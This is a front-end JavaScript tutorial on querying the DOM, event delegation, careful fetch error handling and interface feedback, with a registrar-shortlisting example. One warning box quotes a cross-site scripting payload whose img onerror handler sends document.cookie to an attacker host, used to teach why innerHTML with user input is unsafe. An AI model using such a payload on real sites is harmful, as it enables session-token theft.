The page has a Shortlist button and your code has never been introduced to it.
The **DOM** is the browser's live object model of the page, and everything
interactive is reading it, changing it, or listening to it.

## Why this matters in a job

Because this is what front-end work actually is, and because the two mistakes at
the end of this lesson are the reason an interface feels broken while every line
of code is technically correct.

## Finding things

```javascript [dom.js]
document.querySelector('#shortlist-button')       // the first match, or null
document.querySelectorAll('tbody tr')             // all of them, as a NodeList

const row = document.querySelector('[data-application-id="9001"]');
row.dataset.applicationId                         // "9001" — from data-* attributes
row.textContent = 'Shortlisted';                  // safe: text, never parsed
row.classList.add('is-shortlisted');
row.setAttribute('aria-selected', 'true');
```

::warning{icon="i-lucide-alert-triangle"}
`element.innerHTML = userInput` is the front-end equivalent of string-concatenated
SQL. If the input contains `<img src=x onerror="fetch('https://attacker/'+document.cookie)">`
it runs. That is cross-site scripting, and it is how session tokens get stolen.
Use `textContent` for text, always. If you genuinely need markup, sanitise it
with a library, never with your own regular expression.
::

## Reacting to things

```javascript [events.js]
const button = document.querySelector('#shortlist-button');

button.addEventListener('click', async (event) => {
  event.preventDefault();          // stop the browser's default: form submit, link
  await shortlist();
});
```

For a table of 412 rows, do not add 412 listeners. Add one, and ask what was
clicked.

```javascript [delegation.js]
// Event delegation: one listener on the container.
document.querySelector('#applications').addEventListener('click', (event) => {
  const button = event.target.closest('[data-action="shortlist"]');
  if (!button) return;                          // clicked something else

  const id = button.closest('tr').dataset.applicationId;
  shortlist(id);
});
```

One listener instead of 412, and it keeps working for rows added later, which the
412 version does not. `closest` walks up from whatever was clicked, which matters
because a click on an icon inside the button reports the icon as the target.

## Talking to your server

```javascript [api.js]
async function shortlist(applicationId) {
  const button = document.querySelector(`[data-application-id="${applicationId}"] button`);

  button.disabled = true;                    // 1. stop the double submit
  button.textContent = 'Shortlisting…';      // 2. say something is happening

  try {
    const response = await fetch(`/api/applications/${applicationId}/shortlist`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken
      },
      body: JSON.stringify({ shortlistedOn: new Date().toISOString() })
    });

    if (!response.ok) {                      // 3. 404 and 500 do NOT throw
      const problem = await response.json().catch(() => ({}));
      throw new Error(problem.message ?? `Request failed: ${response.status}`);
    }

    const updated = await response.json();
    render(updated);                         // 4. show the SERVER's version
  } catch (error) {
    showError(`Could not shortlist. ${error.message}`);
    button.disabled = false;                 // 5. let them try again
  } finally {
    button.textContent = 'Shortlist';
  }
}
```

## The two mistakes that make it feel broken

::compare{caption="Mistake one: optimism."}
  :::compare-side{label="Update the screen immediately" verdict="wrong"}
  ```javascript
  row.textContent = 'Shortlisted';
  fetch(url, { method: 'POST' });        // not awaited, not checked
  ```
  It looks instant. The request fails, nobody finds out, and the registrar
  believes 54 applicants were shortlisted when 12 were. The interface and the
  database now disagree and only one of them is real.
  :::
  :::compare-side{label="Say it is happening, then show the truth" verdict="right"}
  Pending state, await the response, render what came back, and show an error if
  it failed. Slightly slower, and it is never lying.
  :::
::

::compare{caption="Mistake two: no feedback at all."}
  :::compare-side{label="Silence" verdict="wrong"}
  The user taps. Nothing changes for 1.4 seconds. They tap again. Now there are
  two requests, and the second one may arrive first.
  :::
  :::compare-side{label="Immediate acknowledgement" verdict="right"}
  The button disables and its label changes within one frame. The perceived
  speed of an interface is mostly about how quickly it acknowledges, not how
  quickly it finishes.
  :::
::

::pull-quote
An interface that acknowledges in 50 milliseconds and finishes in two seconds
feels faster than one that is silent for 800 milliseconds and then completes.
Perceived speed is a different measurement from speed.
::

## Never trust the browser

```javascript [never.js]
// This hides the button. It does not stop anybody.
if (!user.isRegistrar) {
  shortlistButton.style.display = 'none';
}
```

Anybody can open developer tools, unhide it, and click. Or skip the page
entirely and `curl` the endpoint. The permission check belongs on the server, and
this hiding is a convenience for honest users.

::side-note{kind="security"}
Three rules that cover most front-end security. Every check that matters is
repeated on the server. Never put a secret in front-end code, because it ships to
every visitor. And never build HTML from user input with `innerHTML`. Those three
prevent the overwhelming majority of what a junior would otherwise ship.
::

## What you can do now

You can make a page interactive, call your own API correctly including the
failure path, and avoid the two mistakes that make a working interface feel
broken.

## Your turn

Make the applications table work.

1. Filtering by minimum score, without a page reload.
2. A Shortlist button per row, with pending, success and error states.
3. One listener for the whole table, not one per row.
4. Then: switch off the network in developer tools and use it.

::accordion
  :::accordion-item{label="What step four reveals" icon="i-lucide-wifi-off"}
  Nearly always the same three things, and none of them appear while the network
  is fast.

  **The button stays disabled forever.** The failure path did not re-enable it,
  so the only way out is a reload.

  **The error message is useless.** "Failed to fetch" is the browser's words, not
  yours. Catch it and say something a registrar can act on: "Could not reach the
  server. Your change was not saved. Check your connection and try again."

  **The row updated anyway.** Optimistic update with no rollback. The screen now
  says shortlisted and the database does not.

  Throttling the network to "Slow 3G" rather than switching it off is the
  version worth doing regularly, because it is what a real user in a real place
  actually experiences, and it makes every missing loading state obvious at once.
  :::
::

## The interview question this answers

**"How do you handle an API call in the browser?"**

The happy path is three lines and nobody is asking about it. The answer is the
rest: disable the control before the request so a double tap cannot fire twice,
show a pending state within a frame, check `response.ok` because fetch does not
reject on a 404 or 500, render what the server returned rather than what you
assumed, and re-enable on failure with an error a user can act on.

Then close with the rule: the permission check is on the server, and anything
in the browser is a convenience for honest users.
